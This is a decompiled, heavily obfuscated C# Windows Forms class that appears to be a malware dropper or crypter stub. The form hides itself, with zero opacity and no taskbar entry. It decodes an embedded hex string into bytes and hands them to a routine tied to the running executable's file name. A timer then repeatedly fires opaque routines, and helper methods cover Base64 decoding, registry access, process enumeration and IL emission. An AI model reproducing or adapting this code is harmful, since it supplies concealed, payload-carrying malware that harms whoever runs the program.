using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Reflection.Emit;
using System.Runtime.CompilerServices;
using System.Security;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using ns0;
using ns1;
using ns2;

namespace ns3;

internal class Form0 : Form
{
	public IContainer icontainer_0;

	private Class5.Struct1 struct1_0;

	void Form.Dispose(bool disposing)
	{
		try
		{
			if (disposing && icontainer_0 != null)
			{
				icontainer_0.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	public void method_0()
	{
		//IL_003c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0046: Expected O, but got Unknown
		//IL_0047: Unknown result type (might be due to invalid IL or missing references)
		//IL_0051: Expected O, but got Unknown
		//IL_0052: Unknown result type (might be due to invalid IL or missing references)
		//IL_005c: Expected O, but got Unknown
		//IL_005d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0067: Expected O, but got Unknown
		//IL_0068: Unknown result type (might be due to invalid IL or missing references)
		//IL_0072: Expected O, but got Unknown
		//IL_0073: Unknown result type (might be due to invalid IL or missing references)
		//IL_007d: Expected O, but got Unknown
		//IL_007e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0088: Expected O, but got Unknown
		//IL_0089: Unknown result type (might be due to invalid IL or missing references)
		//IL_0093: Expected O, but got Unknown
		//IL_0325: Unknown result type (might be due to invalid IL or missing references)
		//IL_032b: Expected O, but got Unknown
		Class2.smethod_1((Control)(object)this, bool_0: false, 1009, 972);
		smethod_0((Form)(object)this, bool_0: false, 1003, 982);
		Class0.smethod_3((Form)(object)this, 0.0, 163, 220);
		vmethod_1(new TextBox());
		vmethod_3(new Button());
		vmethod_5(new Label());
		vmethod_7(new Label());
		vmethod_9(new Label());
		vmethod_11(new Label());
		vmethod_13(new Panel());
		vmethod_15(new ProgressBar());
		Class0.smethod_4((Control)(object)this, 526, 515);
		TextBox control_ = vmethod_0();
		Point point_ = new Point(12, 23);
		Class5.smethod_0((Control)(object)control_, point_, 873, 837);
		Class2.smethod_2((Control)(object)vmethod_0(), Class0.smethod_1(521225888, 7), 975, 921);
		Class5.smethod_1(vmethod_0(), Class0.smethod_1(521225910, 6), 521, 531);
		TextBox control_2 = vmethod_0();
		Size size_ = new Size(100, 20);
		smethod_1((Control)(object)control_2, size_, 270, 309);
		Class5.smethod_2((Control)(object)vmethod_0(), 0, 747, 657);
		Button control_3 = vmethod_2();
		point_ = new Point(12, 49);
		Class5.smethod_0((Control)(object)control_3, point_, 989, 1009);
		Class2.smethod_2((Control)(object)vmethod_2(), Class0.smethod_1(521225910, 3), 505, 431);
		Button control_4 = vmethod_2();
		size_ = new Size(75, 23);
		smethod_1((Control)(object)control_4, size_, 516, 575);
		Class5.smethod_2((Control)(object)vmethod_2(), 1, 654, 756);
		smethod_2((ButtonBase)(object)vmethod_2(), Class0.smethod_1(521225905, 4), 4, 0);
		smethod_3((ButtonBase)(object)vmethod_2(), bool_0: true, 897, 940);
		SizeF sizeF_ = new SizeF(6f, 13f);
		Class5.smethod_3((ContainerControl)(object)this, sizeF_, 675, 708);
		smethod_4((ContainerControl)(object)this, (AutoScaleMode)1, 548, 591);
		size_ = new Size(284, 262);
		Class2.smethod_3((Form)(object)this, size_, 962, 959);
		Class0.smethod_5((Control)(object)this, 573, 544).Add((Control)(object)vmethod_14());
		Class0.smethod_5((Control)(object)this, 617, 628).Add((Control)(object)vmethod_12());
		Class0.smethod_5((Control)(object)this, 752, 749).Add((Control)(object)vmethod_10());
		Class0.smethod_5((Control)(object)this, 317, 288).Add((Control)(object)vmethod_8());
		((Control)this).get_Controls().Add((Control)(object)vmethod_6());
		((Control)this).get_Controls().Add((Control)(object)vmethod_4());
		((Control)this).get_Controls().Add((Control)(object)vmethod_2());
		((Control)this).get_Controls().Add((Control)(object)vmethod_0());
		((Control)this).set_Name(Class0.smethod_1(521225918, 1));
		((Form)this).set_Text(Class0.smethod_1(521225912, 7));
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
		((Form)this).set_Opacity(0.0);
		Timer timer_ = new Timer();
		struct1_0.timer_0 = timer_;
		((Form)this).set_ShowInTaskbar(false);
		struct1_0.timer_0.set_Interval(2000);
		struct1_0.timer_0.add_Tick((EventHandler)method_2);
	}

	public Form0()
	{
		method_0();
		method_1();
	}

	private void method_1()
	{
		string string_ = Class0.smethod_6(Class2.smethod_0(), 561, 513);
		byte[] byte_ = method_3(string_);
		Class4.smethod_0(byte_, Class2.smethod_4(Class1.smethod_2(949, 1007), 139, 221).FileName);
		struct1_0.timer_0.Start();
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	private unsafe void method_2(object sender, EventArgs e)
	{
		void* ptr = stackalloc byte[8];
		try
		{
			*(int*)ptr = 3;
			while (true)
			{
				switch (*(int*)ptr)
				{
				default:
					goto IL_000a;
				case 5:
					Class3.smethod_6();
					goto case 0;
				case 0:
				case 2:
					Class3.smethod_7();
					break;
				case 1:
					break;
				}
				break;
				IL_000a:
				Class3.smethod_0();
				Class3.smethod_1();
				Class3.smethod_2();
				Class3.smethod_3();
				Class3.smethod_4();
				Class3.smethod_5();
				*(int*)ptr = 5;
			}
			Class2.smethod_5(647, 685);
		}
		catch (Exception exception_)
		{
			Class5.smethod_4(exception_, 782, 873);
			ProjectData.ClearProjectError();
		}
		*(int*)((byte*)ptr + 4) = 1;
		switch (*(int*)((byte*)ptr + 4))
		{
		}
	}

	private unsafe byte[] method_3(string string_0)
	{
		void* ptr = stackalloc byte[24];
		string text = string_0;
		*(int*)((byte*)ptr + 16) = Class6.smethod_0(text, 334, 376);
		*(int*)((byte*)ptr + 20) = *(int*)((byte*)ptr + 16) / 2;
		byte[] array;
		checked
		{
			if (unchecked(*(int*)((byte*)ptr + 16) % 2) == 0)
			{
				(*unchecked((int*)((byte*)ptr + 20)))--;
			}
			else
			{
				text = Class5.smethod_5(Class0.smethod_1(521225921, 5), text, 219, 228);
			}
			array = new byte[*unchecked((int*)((byte*)ptr + 20)) + 1];
		}
		*(long*)((byte*)ptr + 8) = *(int*)((byte*)ptr + 20);
		*(long*)ptr = 0L;
		while (*(long*)ptr <= *(long*)((byte*)ptr + 8))
		{
			checked
			{
				array[(int)(*unchecked((long*)ptr))] = Class1.smethod_3(Class2.smethod_6(text, (int)(*unchecked((long*)ptr) * 2L), 2, 627, 534), 16, 293, 360);
				(*unchecked((long*)ptr))++;
			}
		}
		return array;
	}

	[SpecialName]
	internal virtual TextBox vmethod_0()
	{
		return struct1_0.textBox_0;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_1(TextBox textBox_0)
	{
		struct1_0.textBox_0 = textBox_0;
	}

	[SpecialName]
	internal virtual Button vmethod_2()
	{
		return struct1_0.button_0;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_3(Button button_0)
	{
		struct1_0.button_0 = button_0;
	}

	[SpecialName]
	internal virtual Label vmethod_4()
	{
		return struct1_0.label_0;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_5(Label label_0)
	{
		struct1_0.label_0 = label_0;
	}

	[SpecialName]
	internal virtual Label vmethod_6()
	{
		return struct1_0.label_1;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_7(Label label_0)
	{
		struct1_0.label_1 = label_0;
	}

	[SpecialName]
	internal virtual Label vmethod_8()
	{
		return struct1_0.label_2;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_9(Label label_0)
	{
		struct1_0.label_2 = label_0;
	}

	[SpecialName]
	internal virtual Label vmethod_10()
	{
		return struct1_0.label_3;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_11(Label label_0)
	{
		struct1_0.label_3 = label_0;
	}

	[SpecialName]
	internal virtual Panel vmethod_12()
	{
		return struct1_0.panel_0;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_13(Panel panel_0)
	{
		struct1_0.panel_0 = panel_0;
	}

	[SpecialName]
	internal virtual ProgressBar vmethod_14()
	{
		return struct1_0.progressBar_0;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_15(ProgressBar progressBar_0)
	{
		struct1_0.progressBar_0 = progressBar_0;
	}

	[SecuritySafeCritical]
	internal static void smethod_0(Form form_0, bool bool_0, int int_0, int int_1)
	{
		while (true)
		{
			switch (int_1 ^ int_0)
			{
			case 61:
				form_0.set_ShowInTaskbar(bool_0);
				return;
			}
		}
	}

	[SecuritySafeCritical]
	internal static void smethod_1(Control control_0, Size size_0, int int_0, int int_1)
	{
		while (true)
		{
			switch (int_1 ^ int_0)
			{
			case 59:
				control_0.set_Size(size_0);
				return;
			}
		}
	}

	[SecuritySafeCritical]
	internal static void smethod_2(ButtonBase buttonBase_0, string string_0, int int_0, int int_1)
	{
		while (true)
		{
			switch (int_1 ^ int_0)
			{
			case 4:
				buttonBase_0.set_Text(string_0);
				return;
			}
		}
	}

	[SecuritySafeCritical]
	internal static void smethod_3(ButtonBase buttonBase_0, bool bool_0, int int_0, int int_1)
	{
		while (true)
		{
			switch (int_1 ^ int_0)
			{
			case 45:
				buttonBase_0.set_UseVisualStyleBackColor(bool_0);
				return;
			}
		}
	}

	[SecuritySafeCritical]
	internal static void smethod_4(ContainerControl containerControl_0, AutoScaleMode autoScaleMode_0, int int_0, int int_1)
	{
		//IL_0016: Unknown result type (might be due to invalid IL or missing references)
		while (true)
		{
			switch (int_1 ^ int_0)
			{
			case 107:
				containerControl_0.set_AutoScaleMode(autoScaleMode_0);
				return;
			}
		}
	}

	[SecuritySafeCritical]
	internal static char[] smethod_5(string string_0, int int_0, int int_1)
	{
		while (true)
		{
			switch (int_1 ^ int_0)
			{
			case 80:
				return string_0.ToCharArray();
			}
		}
	}

	[SecuritySafeCritical]
	internal static LocalBuilder smethod_6(ILGenerator ilgenerator_0, Type type_0, int int_0, int int_1)
	{
		while (true)
		{
			switch (int_1 ^ int_0)
			{
			case 17:
				return ilgenerator_0.DeclareLocal(type_0);
			}
		}
	}

	[SecuritySafeCritical]
	internal static byte[] smethod_7(string string_0, int int_0, int int_1)
	{
		while (true)
		{
			switch (int_1 ^ int_0)
			{
			case 100:
				return Convert.FromBase64String(string_0);
			}
		}
	}

	[SecuritySafeCritical]
	internal static RegistryKey smethod_8(RegistryKey registryKey_0, string string_0, bool bool_0, int int_0, int int_1)
	{
		while (true)
		{
			switch (int_1 ^ int_0)
			{
			case 106:
				return registryKey_0.OpenSubKey(string_0, bool_0);
			}
		}
	}

	[SecuritySafeCritical]
	internal static Process[] smethod_9(int int_0, int int_1)
	{
		while (true)
		{
			switch (int_1 ^ int_0)
			{
			case 107:
				return Process.GetProcesses();
			}
		}
	}

	[SecuritySafeCritical]
	internal static bool smethod_10(string string_0, string string_1, int int_0, int int_1)
	{
		while (true)
		{
			switch (int_1 ^ int_0)
			{
			case 116:
				return string.Equals(string_0, string_1);
			}
		}
	}

	[SecuritySafeCritical]
	internal static int smethod_11(string string_0, string string_1, bool bool_0, int int_0, int int_1)
	{
		while (true)
		{
			switch (int_1 ^ int_0)
			{
			case 50:
				return Operators.CompareString(string_0, string_1, bool_0);
			}
		}
	}
}
